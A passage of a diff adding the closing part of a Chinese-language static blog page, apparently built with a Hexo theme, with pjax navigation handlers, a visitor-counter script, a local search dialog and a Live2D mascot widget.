+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      false
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章喵...hhh你找到我了吗" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"react":{"opacity":0.9},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
